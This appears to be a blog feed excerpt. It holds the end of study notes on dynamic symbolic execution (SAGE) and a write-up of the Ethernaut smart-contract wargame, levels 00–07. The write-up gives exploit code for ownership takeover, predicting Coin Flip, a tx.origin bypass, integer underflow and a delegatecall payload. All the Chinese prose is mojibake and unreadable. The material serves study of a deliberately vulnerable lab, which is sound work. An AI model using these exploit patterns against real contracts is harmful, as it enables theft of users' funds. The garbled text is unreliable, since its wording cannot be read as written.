<li>ä»¥å…·ä½“çš„æ•°å€¼ä½œä¸ºè¾“å…¥ï¼Œæ‰§è¡Œç¨‹åºä»£ç ï¼Œåœ¨ç¨‹åºå®é™…æ‰§è¡Œè·¯å¾„çš„åŸºç¡€ä¸Šï¼š
<ol type="1">
<li>ç”¨ç¬¦å·æ‰§è¡ŒæŠ€æœ¯å¯¹è·¯å¾„è¿›è¡Œåˆ†æ</li>
<li>æå–è·¯å¾„çš„çº¦æŸè¡¨è¾¾å¼</li>
<li>æ ¹æ®è·¯å¾„æœç´¢ç­–ç•¥(æ·±åº¦ã€å¹¿åº¦)å¯¹çº¦æŸè¡¨è¾¾å¼è¿›è¡Œå˜å½¢</li>
<li>æ±‚è§£å˜å½¢åçš„è¡¨è¾¾å¼å¹¶ç”Ÿæˆæ–°çš„æµ‹è¯•ç”¨ä¾‹</li>
<li>ä¸æ–­è¿­ä»£ä¸Šè¿°è¿‡ç¨‹ï¼Œç›´åˆ°å®Œå…¨éå†ç¨‹åºçš„æ‰€æœ‰æ‰§è¡Œè·¯å¾„</li>
</ol></li>
<li>DSEçš„å‡ºç°æ˜¯ä¸ºäº†è§£å†³é™æ€SEâ‘ æ‰§è¡Œæ•ˆç‡ä½â‘¡ç³»ç»Ÿå¼€é”€å¤§â‘¢è¯¯æŠ¥ç‡é«˜çš„é—®é¢˜</li>
</ol></li>
<li><strong>å®ç°ç»†èŠ‚(ä»¥å‡½æ•°ä¸ºä¾‹)</strong>
<ol type="1">
<li>åœºæ™¯ï¼š<code>void func(int a,int b)</code>,è°ƒç”¨<code>func(X,Y)</code></li>
<li>Step1: ç”Ÿæˆä¸€ç»„éšæœºè¾“å…¥ï¼Œå¼€å§‹"å®é™…æ‰§è¡Œ"</li>
<li>Step2:
<strong>åŒæ—¶</strong>ç¬¦å·å¼•æ“å¼€å§‹ç¬¦å·æ‰§è¡Œï¼ŒæŒ‰ç…§â€œå®é™…æ‰§è¡Œâ€çš„â€œæ‰§è¡Œè·¯å¾„â€ä¸Šçš„åˆ†æ”¯æ¡ä»¶è¯­å¥çš„â€œè°“è¯â€ï¼Œæœé›†æ‰€æœ‰ç¬¦å·çº¦æŸæ¡ä»¶åŠå…¶å¯¹åº”çœŸå€¼</li>
<li>Step3:
æ ¹æ®æ”¶é›†åˆ°çš„ç¬¦å·çº¦æŸæ¡ä»¶ï¼ŒæŒ‰ç…§ä¸€å®šè·¯å¾„é€‰æ‹©ç­–ç•¥ï¼Œæ„é€ å‡ºä¸€æ¡æ–°çš„å¯è¡Œè·¯å¾„çº¦æŸ
<ul>
<li>ä¸¾ä¸ªä¾‹å­ï¼šæ·±åº¦ä¼˜å…ˆç­–ç•¥</li>
<li>å¦‚æœ<code>pc = p1 âˆ© p2 âˆ© p3</code>,
æ·±åº¦ä¼˜å…ˆå°±æ˜¯å°†æœ€åä¸€ä¸ªè°“è¯(å¯¹ä¸èµ·joå¤ªéƒğŸ˜­ç¦»æ•£æ²¡å­¦å¥½å¿˜äº†è¿™ä¸ªp3å«å•¥äº†)å–éï¼Œå˜ä¸º<code>p1 âˆ© p2 âˆ© ~p3</code></li>
</ul></li>
<li>Step4: ä½¿ç”¨çº¦æŸæ±‚è§£å™¨æ±‚è§£å‡ºæ–°çº¦æŸé›†åˆå¯¹åº”çš„å…·ä½“è¾“å…¥</li>
<li>Step5: é‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œç›´åˆ°éå†å…¨éƒ¨è·¯å¾„</li>
</ol></li>
<li><strong>DSEå·¥å…·SAGE</strong>
<ol type="1">
<li>åŸç†ç²—ç•¥åœ°è¿‡äº†ä¸€éï¼Œå¤§æ®µå¤§æ®µçš„çœ‹ä¸æ‡‚ğŸ˜­è¿™é‡Œå°±ä¸èŠ±æ—¶é—´æ€»ç»“äº†</li>
<li>SAGEåŸºäºx86çš„æœºå™¨ç è¿›è¡Œç¬¦å·æ‰§è¡Œï¼ŒåŸå› å¦‚ä¸‹ï¼š
<ol type="1">
<li>å±è”½ä¸åŒç¼–ç¨‹è¯­è¨€ã€ç¼–è¯‘å™¨åŠç¼–è¯‘å¹³å°å¯¹åˆ†æè¿‡ç¨‹çš„å½±å“ï¼Œå…·æœ‰æ›´å¼ºçš„å¤ç”¨æ€§</li>
<li>å¿½ç•¥ç¼–è¯‘å™¨"ä»£ç ä¼˜åŒ–""ä»£ç æ··æ·†""åŸºæœ¬å—è½¬æ¢"ç­‰ä½¿ä»£ç è¯­ä¹‰å‘ç”Ÿå˜åŒ–çš„æ“ä½œï¼Œæœ‰åˆ©äºç¡®å®šç¨‹åºå®é™…å­˜åœ¨çš„æ¼æ´</li>
<li>é—­æºåˆ†æyyds</li>
</ol></li>
</ol></li>
<li><strong>å…³é”®é—®é¢˜</strong>
<ol type="1">
<li>å¤–éƒ¨å‡½æ•°è°ƒç”¨</li>
<li>å¾ªç¯é—®é¢˜ï¼šè·¯å¾„çˆ†ç‚¸</li>
</ol></li>
</ul>
<blockquote>
<p>è¿™ä¸€æ®µä¹Ÿä¸ä»”ç»†è¯»äº†...ç”¨åˆ°å†å­¦</p>
</blockquote>
<h1 id="x02-å¹¶è¡Œç¬¦å·æ‰§è¡ŒæŠ€æœ¯pse">0x02
<strong>å¹¶è¡Œç¬¦å·æ‰§è¡ŒæŠ€æœ¯(PSE)</strong></h1>
<ul>
<li><strong>åŸºæœ¬æ€æƒ³</strong>
<ol type="1">
<li>å¾ˆå¤šæƒ…å†µä¸‹ç¬¦å·æ‰§è¡Œå¼•æ“æ— æ³•ç»§ç»­è¿è¡Œçš„åŸå› æ˜¯å†…å­˜ä¸è¶³ï¼Œæ‰€ä»¥æˆ‘ä»¬å¸Œæœ›é€šè¿‡è®¡ç®—é›†ç¾¤å¯æ— ç©·æ‰©å±•çš„å†…å­˜ç©ºé—´å’ŒCPUæ¥ç¼“è§£è·¯å¾„çˆ†ç‚¸é—®é¢˜</li>
<li>åˆ†å¸ƒå¼...è¿™æˆ‘å°±å…ˆä¸çœ‹äº†</li>
</ol></li>
</ul>
<h1 id="x03-å‚è€ƒæ–‡çŒ®">0x03 å‚è€ƒæ–‡çŒ®</h1>
<p>1ã€Šè½¯ä»¶å®‰å…¨åˆ†æä¸åº”ç”¨ã€‹</p>
]]></content>
      <categories>
        <category>Software analysis technology</category>
      </categories>
      <tags>
        <tag>SymbolicExecution</tag>
      </tags>
  </entry>
  <entry>
    <title>blockchain - Ethernautæ™ºèƒ½åˆçº¦æ¼æ´é¶åœºå¤ç°</title>
    <url>/2024/07/19/blockchain%20-%20%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
æ¥åˆ°äº†é“¾ä¸Šçš„é¡¹ç›®ï¼Œæ­£å¥½å­¦ä¹ ä¸€ä¸‹
</blockquote>
<span id="more"></span>
<h1 id="x00-ç¯å¢ƒæ­å»º">0x00 ç¯å¢ƒæ­å»º</h1>
<p>æˆ‘ç”¨çš„æ˜¯<a
href="https://ethernaut.openzeppelin.com/">è¿™ä¸ªé¶åœº</a>ï¼Œéœ€è¦ä¸‹è½½MetaMaskï¼Œä¸‹è½½å®Œæ¯•ä¹‹åå¯ä»¥åˆ‡æ¢åˆ°Sepoliaæµ‹è¯•å¸ï¼Œå»<a
href="https://sepolia-faucet.pk910.de/">è¿™é‡Œ</a>å¼€æºæŒ–å¸ï¼Œå°±æœ‰æµ‹è¯•å¸å¯ä»¥æ­å»ºInstanceäº†(ä¸è¿‡éœ€è¦è®¤è¯scoreï¼Œä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦è®¤è¯å¥½githubå°±èƒ½è¿‡)</p>
<h1 id="x01-é¢˜ç›®">0x01 é¢˜ç›®</h1>
<h2 id="hello-ethernaut">00 Hello Ethernaut</h2>
<p>è¿™ä¸ªé¢˜ç›®å®Œå…¨æ˜¯æ–°æ‰‹æ•™ç¨‹ï¼Œè®©æˆ‘ä»¬ä¸contractçš„infoè¿™ä¸ªmethodè¿›è¡Œäº¤äº’ï¼Œæˆ‘ä»¬æ‰“å¼€æ§åˆ¶å°æŒ‰ç…§ä»–çš„æ„æ€ä¸€ç›´contract.xxx("xxx")å°±è¡Œäº†</p>
<h2 id="fallback">01 Fallback</h2>
<h3 id="basic">Basic</h3>
<p>è¿™ä¸€å…³çš„åå­—æ˜¯Fallbackï¼Œfallbackæ˜¯ä¸€ç±»å‡½æ•°ï¼Œè¿™ç±»å‡½æ•°å¯ä»¥åœ¨åˆçº¦æ¥æ”¶åˆ°ä»¥å¤ªå¸æ—¶æ‰§è¡Œä¸€äº›æ“ä½œï¼ˆExplorationé‡Œæœ‰æ›´ç²¾ç¡®çš„å®šä¹‰ï¼‰ã€‚æœ¬é¢˜ä¸­ï¼Œå½“æ¥æ”¶çš„å¸å¤§äº0å¹¶ä¸”å¸çš„å‘é€æ–¹åœ¨å‘é€è¿™æ¡æ¶ˆæ¯ä¹‹å‰å·²ç»å¯¹è¯¥åˆçº¦æœ‰äº†è´¡çŒ®ï¼ˆå‘é€è¿‡å¸ï¼‰ï¼Œé‚£å°±æŠŠè¿™ä¸ªåˆçº¦çš„æ‰€æœ‰æƒç§»äº¤ç»™å¸çš„å‘é€æ–¹ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªéœ€è¦ <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure>
å°±å·²ç»å°†æ§åˆ¶æƒæŒæ¡åœ¨æˆ‘ä»¬æ‰‹ä¸­äº†ï¼Œæ­¤æ—¶å°±å¯ä»¥ä½¿ç”¨è¢«onlyOwnerè¿™ä¸ªmodifierä¿®é¥°çš„withdrawå‡½æ•°äº†
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()              <span class="comment">// æŸ¥çœ‹åˆçº¦æ‰€æœ‰æƒ</span></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)  <span class="comment">// æŸ¥çœ‹åˆçº¦å‰©ä½™ä½™é¢</span></span><br></pre></td></tr></table></figure></p>
<h3 id="exploration">Exploration</h3>
<p>æˆ‘å¾ˆå¥½å¥‡æŒ‰ç…§ä¸Šé¢çš„è¯´æ³•ï¼Œcontributeä¸¤æ¬¡åº”è¯¥ä¹Ÿå¯ä»¥å§ï¼Œä¸ç”¨éå¾—contributeä¸€æ¬¡å†sendtransactionä¸€æ¬¡æ‰èƒ½ææƒã€‚åæ¥æˆ‘å°è¯•äº†ä¸€ä¸‹æœç„¶ä¸è¡Œï¼Œå› ä¸ºcontributeåœ¨åˆçº¦é‡Œæœ‰æ˜ç¡®å®šä¹‰ï¼Œåˆçº¦æ”¶åˆ°Etherä¹‹åä¼šè°ƒç”¨contributeé‡Œçš„é€»è¾‘å»å¤„ç†è¿™ä¸ªEtherã€‚ä½†sendTransactionå±äºå‘åˆçº¦å‘èµ·äº¤æ˜“ï¼Œå¹¶ä¸”æ²¡æœ‰é™„åŠ æ•°æ®(msg.data)ï¼Œå› æ­¤ä¼šéšå¼è°ƒç”¨receiveå‡½æ•°ï¼ˆä¹Ÿå°±æ˜¯Fallbackå‡½æ•°ï¼‰è¿›è¡Œé€»è¾‘å¤„ç†ã€‚</p>
<p>å› æ­¤æœ¬é¢˜fallbackå‡½æ•°çš„è°ƒç”¨æ¡ä»¶æ˜¯ï¼šå½“åˆçº¦æ¥æ”¶åˆ°ä»£å¸ä½†æ²¡æœ‰å¤„ç†ä»£å¸çš„å‡½æ•°ï¼Œå¹¶ä¸”æ²¡æœ‰é™„åŠ æ•°æ®æ—¶ï¼Œä¼šè°ƒç”¨fallbackå‡½æ•°æ¥å¤„ç†ã€‚ä½†æˆ‘é—®äº†GPTè€å¸ˆï¼Œä»–çš„å›ç­”æ˜¯è¿™æ ·çš„ï¼š</p>
<p>è§¦å‘ fallback å‡½æ•°çš„æƒ…å†µï¼š</p>
<p>â‘ è°ƒç”¨ä¸å­˜åœ¨çš„å‡½æ•°ï¼šå¦‚æœè°ƒç”¨çš„å‡½æ•°åœ¨åˆçº¦ä¸­ä¸å­˜åœ¨ï¼Œä¸”åˆçº¦å®šä¹‰äº†
fallback å‡½æ•°ï¼Œåˆ™ä¼šè§¦å‘ fallback å‡½æ•°ã€‚</p>
<p>â‘¡å‘é€ä»¥å¤ªå¸ä½†æ²¡æœ‰æ•°æ®ï¼Œä¸”æ²¡æœ‰å®šä¹‰ receive å‡½æ•°ï¼šå¦‚æœåˆçº¦ä¸­æ²¡æœ‰å®šä¹‰
receive å‡½æ•°ï¼Œå‘é€çº¯ä»¥å¤ªå¸ä¸”æ²¡æœ‰é™„åŠ æ•°æ®æ—¶ï¼Œä¼šè§¦å‘ fallback å‡½æ•°ã€‚</p>
<p>â‘¢å‘é€ä»¥å¤ªå¸ä¸”æœ‰é™„åŠ æ•°æ®ï¼šå¦‚æœå‘é€ä»¥å¤ªå¸ä¸”é™„åŠ äº†æ•°æ®ï¼ˆå³ msg.data
ä¸ä¸ºç©ºï¼‰ï¼Œå³ä½¿åˆçº¦å®šä¹‰äº† receive å‡½æ•°ï¼Œä¹Ÿä¼šè§¦å‘ fallback å‡½æ•°ã€‚</p>
<p>expå¦‚ä¸‹ <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)</span><br><span class="line"><span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)</span><br><span class="line"><span class="string">&#x27;0.000000000000000001&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)</span><br><span class="line"><span class="string">&#x27;0.000000000000000002&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x9a80a78bebE92EF9cDfC4CA116fC4925237fDbd0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>()</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x9a80a78bebE92EF9cDfC4CA116fC4925237fDbd0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)</span><br><span class="line"><span class="string">&#x27;0&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>ps: æ‰“è¿™å…³çš„æ—¶å€™æäº¤æœ‰çš„æ—¶å€™ä¼šæ˜¾ç¤ºä¸é€šè¿‡ï¼Œä½†å¤šsubmitå‡ æ¬¡å°±å¥½äº†</p>
<h2 id="fallout">02 Fallout</h2>
<p>è¿™é¢˜è²Œä¼¼æ˜¯æƒ³å‘Šè¯‰æˆ‘ä»¬ä¸è¦æŠŠæ„é€ å‡½æ•°å…¬æœ‰åŒ–ï¼Ÿå› ä¸ºåªè¦è°ƒç”¨è¿™ä¸ªFal1outå‡½æ•°å°±èƒ½æŒæ¡æ‰€æœ‰æƒäº†ã€‚</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title class_">Fal1</span>out()</span><br></pre></td></tr></table></figure>
<h2 id="coin-flip">03 Coin Flip</h2>
<p>çŒœç¡¬å¸ï¼Œè¿™ç§éšæœºæ•°è‚¯å®šæ˜¯ä¼ªéšæœºæ•°ï¼Œå¯ä»¥é¢„æµ‹çš„ã€‚</p>
<p>çœ‹åˆçº¦æºç å¾—çŸ¥blockValueæ˜¯å‰ä¸€ä¸ªåŒºå—çš„hashå€¼ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºæ— ç¬¦å·æ•´æ•°ã€‚</p>
<p>å¦‚æœlasthashå€¼ï¼ˆä¸Šä¸ªåŒºå—çš„hashå€¼ï¼‰ç­‰äºblockValueï¼Œå°±è¯´æ˜è¿™ä¸ªblockValueè¢«ç”¨è¿‡äº†ï¼Œè°ƒç”¨revertå‡½æ•°è¿”å›gasã€‚æˆ‘ä»¬åªèƒ½ç­‰æ–°åŒºå—ç”Ÿæˆä¹‹åå†é¢„æµ‹ï¼ˆæ¯”ç‰¹å¸10minç”Ÿæˆä¸€ä¸ªåŒºå—ï¼Œä»¥å¤ªåŠåªéœ€è¦15sï¼‰</p>
<p>å¦‚æœlasthashç­‰äºblockValueï¼Œå°±ç”¨blockValueé™¤ä»¥FACTORå¾—åˆ°ä¸€ä¸ªç»“æœcoinFlipï¼Œæˆ‘ä»¬è¦çŒœè¿™ä¸ªæ•°å­—æ˜¯1è¿˜æ˜¯0ã€‚</p>
<p>æºç åˆ†æå®Œäº†ï¼Œä¼ªéšæœºæ•°æ˜¯blockValueï¼Œç”±äºæˆ‘ä»¬å·²ç»çŸ¥é“äº†FACTORï¼Œæ‰€ä»¥åªè¦çŸ¥é“äº†blockValueå°±å¯ä»¥ç›´åˆ°åé¢çš„å…¨éƒ¨å†…å®¹ï¼Œæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆå¯ä»¥é¢„æµ‹blockValue</p>
<p>å½“äº¤æ˜“åœ¨é“¾ä¸Šè¢«å‘é€æ—¶ï¼Œè¿™äº›äº¤æ˜“ä¼šè¢«çŸ¿å·¥æ‰“åŒ…åˆ°å³å°†æŒ–å‡ºçš„ä¸‹ä¸€ä¸ªåŒºå—ä¸­ï¼ŒåŒºå—åŒ…å«å¤šä¸ªäº¤æ˜“ï¼Œè¿™äº›äº¤æ˜“ä¼šé¡ºåºæ‰§è¡Œã€‚åœ¨åŒä¸€ç¬”äº¤æ˜“ä¸­ï¼Œå¦‚æœä¸€ä¸ªåˆçº¦è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦ï¼Œè¿™äº›è°ƒç”¨ä¼šåœ¨åŒä¸€ä¸ªåŒºå—ä¸­é¡ºåºæ‰§è¡Œã€‚åŒºå—é“¾çš„æ¯ä¸ªåŒºå—éƒ½æœ‰ä¸€ä¸ªå›ºå®šçš„æ—¶é—´çª—ï¼ˆä¾‹å¦‚ï¼Œæ¯”ç‰¹å¸çš„æ¯ä¸ªåŒºå—æ—¶é—´ä¸º10åˆ†é’Ÿï¼Œä»¥å¤ªåŠçš„æ¯ä¸ªåŒºå—æ—¶é—´ä¸º15ç§’ï¼‰ã€‚åœ¨è¿™ä¸ªæ—¶é—´çª—å†…ï¼Œæ‰€æœ‰è¢«æ‰“åŒ…åˆ°è¿™ä¸ªåŒºå—ä¸­çš„äº¤æ˜“ä¼šå…±äº«ç›¸åŒçš„åŒºå—å“ˆå¸Œå’ŒåŒºå—ç¼–å·ã€‚</p>
<p>å› æ­¤ï¼Œåªè¦æˆ‘ä»¬å†™ä¸€ä¸ªæ”»å‡»åˆçº¦ï¼Œåœ¨æ”»å‡»åˆçº¦ä¸­è·å–block.numberï¼Œå†è°ƒç”¨è¢«æ”»å‡»åˆçº¦çš„flipå‡½æ•°ï¼Œé‚£ä¹ˆflipä¸­çš„block.numberå°±è·Ÿæ”»å‡»åˆçº¦ä¸­çš„numberæ˜¯ç›¸åŒçš„äº†ã€‚å› æ­¤ä¹Ÿå°±è¾¾æˆäº†æ”»å‡»çš„ç›®çš„ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address addr;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    event Result(bool, bool);</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) &#123;</span><br><span class="line">        addr = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip() external &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        (bool success, bytes memory data) = addr.call(abi.encodeWithSignature(&quot;flip(bool)&quot;, side));</span><br><span class="line">        emit Result(success, abi.decode(data, (bool)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="telephone">04 Telephone</h2>
<p>æœ¬é¢˜ä¸»è¦è€ƒå¯Ÿ tx.origin ä¸ msg.sender çš„åŒºåˆ«ï¼Œtx.orgin
æŒ‡çš„æ˜¯äº¤æ˜“çš„å‘èµ·æ–¹ï¼Œmsg.sender
æŒ‡çš„æ˜¯åˆçº¦çš„ç›´æ¥è°ƒç”¨è€…ã€‚æ¯”å¦‚ï¼Œå½“ç”¨æˆ·Xé€šè¿‡åˆçº¦Aè°ƒç”¨åˆçº¦Bæ—¶ï¼šå¯¹äºåˆçº¦Aï¼Œtx.origin
ä¸ msg.sender éƒ½æ˜¯ç”¨æˆ·Xï¼›å¯¹äºåˆçº¦Bï¼Œtx.origin æ˜¯ç”¨æˆ·Xï¼Œmsg.sender
æ˜¯åˆçº¦A</p>
<p>å› æ­¤æˆ‘ä»¬åªéœ€è¦éƒ¨ç½²ä¸€ä¸ªåˆçº¦Aï¼Œé€šè¿‡è¯¥åˆçº¦è°ƒç”¨é¢˜ç›®å‡½æ•°å³å¯ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">  function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Telephone constant private target = Telephone(0xdeE55F3707b4462D224A931cB6B2e2c619C9EFFB);</span><br><span class="line">    function call() public &#123;</span><br><span class="line">        target.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="token">05 Token</h2>
<p>æ•´æ•°æº¢å‡ºã€‚balances å’Œ value éƒ½æ˜¯ uint256
å‹çš„ï¼Œæ‰€ä»¥å‡å®Œäº†è¿˜æ˜¯æ­£æ•°ï¼Œç”±äºåˆå§‹ä½™é¢æœ‰20ï¼Œæˆ‘ä»¬ç›´æ¥å‡21å³å¯
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.<span class="property">address</span></span><br><span class="line"><span class="string">&#x27;0x440f5dD58996e284Bf339399cE48580cf2ADC84b&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">transfer</span>(<span class="string">&quot;0x440f5dD58996e284Bf339399cE48580cf2ADC84b&quot;</span>,<span class="number">21</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="delegation">06 Delegation</h2>
<p>æœ¬é¢˜è€ƒå¯Ÿå¯¹åˆçº¦è°ƒç”¨æ–¹å¼çš„ç†è§£ã€‚åˆçº¦è°ƒç”¨å…±æœ‰ä¸‰ç§æ–¹å¼</p>
<ul>
<li>call: è°ƒç”¨åå†…ç½®å˜é‡ msg
çš„å€¼ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼Œæ‰§è¡Œç¯å¢ƒä¸ºè¢«è°ƒç”¨è€…çš„è¿è¡Œç¯å¢ƒ</li>
<li>delegatecall: è°ƒç”¨åå†…ç½®å˜é‡ msg
çš„å€¼ä¸ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼Œä½†æ‰§è¡Œç¯å¢ƒä¸ºè°ƒç”¨è€…çš„è¿è¡Œç¯å¢ƒï¼ˆç›¸å½“äºå¤åˆ¶è¢«è°ƒç”¨è€…çš„ä»£ç åˆ°è°ƒç”¨è€…åˆçº¦ï¼‰</li>
<li>callcode: è°ƒç”¨åå†…ç½®å˜é‡ msg
çš„å€¼ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼Œä½†æ‰§è¡Œç¯å¢ƒä¸ºè°ƒç”¨è€…çš„è¿è¡Œç¯å¢ƒ &gt; è²Œä¼¼ "callcode"
å·²è¢«å¼ƒç”¨ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ "delegatecall"</li>
</ul>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬ä»¥ call çš„å½¢å¼é€šè¿‡åˆçº¦ Delegation è°ƒç”¨åˆçº¦ Delegate
çš„ pwn å‡½æ•°æ—¶ï¼ŒDelegate ä¸­è®°å½•çš„ msg.sender æ˜¯ Delegation
çš„åœ°å€ï¼›è€Œå½“æˆ‘ä»¬ä»¥ Delegate call çš„å½¢å¼é€šè¿‡åˆçº¦ Delegation è°ƒç”¨åˆçº¦
Delegate çš„ pwn å‡½æ•°æ—¶ï¼ŒDelegate ä¸­è®°å½•çš„ msg.sender
æ˜¯æˆ‘ä»¬è‡ªå·±çš„åœ°å€ã€‚</p>
<p>ç±»æ¯” Telephone é‚£é“é¢˜ï¼Œæ™®é€š call çš„ msg.sender å°±æ˜¯ msg.senderï¼Œè€Œ
DelegateCall çš„ msg.sender æ˜¯ tx.originã€‚</p>
<p>åœ¨æœ¬é¢˜ä¸­ï¼Œåˆçº¦ Deletation éƒ¨ç½²äº†åˆçº¦ Delegateï¼Œå¹¶ä¸”æœ‰ pwn
å‡½æ•°å¯ä»¥è®©æˆ‘ä»¬ææƒï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡è§¦å‘ fallbackï¼Œé€šè¿‡ä¼ å…¥çš„ data è°ƒç”¨
pwn()ï¼Œå³<code>await contract.sendTransaction(&#123;data:"0xdd365b8b"&#125;);</code>ï¼Œè‡³äºä¸ºä»€ä¹ˆæ˜¯
0xdd365b8bï¼Œè¿™å¥½åƒæ˜¯ pwn()
å‡½æ•°çš„ç­¾åå†å“ˆå¸Œä»¥åçš„å‰å››å­—èŠ‚ï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢çš„ solidity ä»£ç ç”Ÿæˆ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    bytes4 public result;</span><br><span class="line">    function test() public  &#123;</span><br><span class="line">        result = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="force">07 Force</h2>
<p>æœ¬é¢˜ç»™äº†ç©ºåˆçº¦ï¼Œæ—¨åœ¨è®©æˆ‘ä»¬å­¦ä¼šå¦‚ä½•åœ¨åˆçº¦æ‹’ç»è½¬å…¥æ—¶å¼ºåˆ¶ç»™å®ƒè½¬å…¥
ETH</p>
<p>å¯ä»¥é€šè¿‡ selfdestruct() å‡½æ•°æ¥å®Œæˆç›®æ ‡ï¼Œè¿™ä¸ªåˆçº¦ææ„å‡½æ•°æœ‰ä»¥ä¸‹æ€§è´¨ï¼š
1. æŒ‡ä»¤æ‰§è¡Œåï¼Œåˆçº¦å°†æ‹’ç»æœåŠ¡ï¼Œåœ°å€å¯¹åº”çš„å­—èŠ‚ç å°†è¢«æ ‡æ³¨ä¸ºåˆ é™¤</p>
<ol start="2" type="1">
<li><p><strong>åˆçº¦åœ°å€ä¸­æ‰€æœ‰çš„ ETH
å°†è¢«å‘é€åˆ°æŒ‡å®šçš„æ–°åœ°å€</strong></p></li>
<li><p>è¿›è¡Œ ETH è½¬ç§»æ—¶ï¼Œå³ä½¿ç›®æ ‡åœ°å€ä¸ºä¸€ä¸ªåˆçº¦åœ°å€ï¼Œä¹Ÿä¸ä¼šè§¦å‘è¯¥åœ°å€çš„
fallback å‡½æ•°ï¼Œå› æ­¤ä¸éœ€è¦è¯¥åˆçº¦æœ‰ä»»ä½•çš„ payable å‡½æ•°</p></li>
